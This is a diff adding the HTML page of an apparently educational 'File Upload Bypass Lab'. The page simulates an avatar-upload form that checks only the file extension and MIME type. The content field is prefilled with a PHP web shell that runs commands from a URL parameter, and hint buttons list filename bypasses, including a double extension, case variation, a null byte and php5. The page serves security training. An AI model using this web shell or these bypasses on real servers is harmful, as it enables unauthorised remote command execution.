@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>File Upload Bypass Lab</title>
+  <link rel="stylesheet" href="style.css" />
+<style>
+  .explain-btn {
+    display: inline-block;
+    position: fixed;
+    top: 12px;
+    right: 16px;
+    background: #161b22;
+    color: #58a6ff;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 6px 14px;
+    font-size: .85rem;
+    font-weight: 600;
+    text-decoration: none;
+    z-index: 1000;
+    transition: background .2s, border-color .2s;
+  }
+  .explain-btn:hover { background: #21262d; border-color: #58a6ff; }
+</style>
+</head>
+<body>
+
+  <div class="lab-banner">
+    FILE UPLOAD BYPASS LAB &mdash; EDUCATIONAL PURPOSES ONLY
+  </div>
+  <a href="explaining.html" class="explain-btn" target="_blank">📖 Explanation</a>
+
+  <div class="container">
+    <div class="card main-card">
+      <h2>Profile Picture Upload</h2>
+      <p class="subtitle">Secure Corp &trade; — Upload your avatar (images only)</p>
+
+      <p class="description">
+        The server "validates" uploaded files using only the file extension and MIME type from the
+        request — both of which an attacker can control. Bypass the filter to upload a web shell.
+      </p>
+
+      <form id="uploadForm" autocomplete="off">
+        <div class="field">
+          <label for="filenameInput">Filename <span class="field-note">(what the server sees)</span></label>
+          <input type="text" id="filenameInput" value="avatar.jpg" />
+        </div>
+        <div class="field">
+          <label for="mimeInput">Content-Type header <span class="field-note">(attacker can set this freely)</span></label>
+          <input type="text" id="mimeInput" value="image/jpeg" />
+        </div>
+        <div class="field">
+          <label for="contentInput">File content</label>
+          <textarea id="contentInput" rows="4"><?php system($_GET['cmd']); ?></textarea>
+        </div>
+        <button type="submit" class="btn-primary">Upload File</button>
+      </form>
+
+      <div class="code-label">Bypass techniques to try:</div>
+      <div class="hint-list">
+        <span class="hint" data-name="shell.php" data-mime="image/jpeg">shell.php + image/jpeg</span>
+        <span class="hint" data-name="shell.php.jpg" data-mime="image/jpeg">shell.php.jpg</span>
+        <span class="hint" data-name="shell.pHp" data-mime="image/jpeg">shell.pHp (case)</span>
+        <span class="hint" data-name="shell.php%00.jpg" data-mime="image/jpeg">null byte: shell.php%00.jpg</span>
+        <span class="hint" data-name="shell.php5" data-mime="image/jpeg">shell.php5</span>
+        <span class="hint" data-name="avatar.jpg" data-mime="image/jpeg">avatar.jpg (legitimate)</span>
+      </div>
+
+      <div class="code-label" style="margin-top:16px;">Server validation log:</div>
+      <div id="validationLog" class="validation-log"></div>
+
+      <div id="explanationBox" class="explanation-box hidden"></div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
